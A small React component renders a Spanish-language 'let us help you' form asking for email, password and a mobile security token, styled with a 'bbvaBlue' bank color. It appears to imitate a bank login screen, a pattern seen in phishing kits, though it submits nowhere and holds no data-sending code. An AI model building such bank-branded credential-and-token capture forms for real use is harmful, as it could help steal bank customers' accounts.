import React from "react";

const Form = () => {
  return (
    <>
      <section className="flex flex-col pt-4 bg-gray-100">
        <span className="font-bold text-xl text-center mx-auto w-full">Permitenos ayudarte!</span>
        <div className="flex items-center">
          <form
            action="#"
            className="w-full sm:w-[250px] p-4 mx-auto flex flex-col rounded-md"
          >
            <label htmlFor="" className="text-gray-600 my-2">Usuario</label>
            <input
              type="email"
              placeholder="Email Address"
              className="px-3 py-2.5 mb-3 border-2 border-gray-800 rounded-md"
            />
            <label htmlFor="" className="text-gray-600 my-2">Contraseña</label>
            <input
              type="password"
              placeholder="Enter Passwords"
              className="px-3 py-2.5 border-2 border-gray-800 rounded-md"
            />
            <label htmlFor="" className="text-gray-600 my-2">Token Mobil</label>
            <input
              type="password"
              placeholder="Enter Passwords"
              className="px-3 py-2.5 border-2 border-gray-800 rounded-md"
            />
            <button
              className="px-2 py-1.5 rounded-md bg-bbvaBlue hover:bg-blue-700 text-white mt-3"
              type="submit"
            >
              Continuar
            </button>
          </form>
        </div>
      </section>
    </>
  );
};

export default Form;
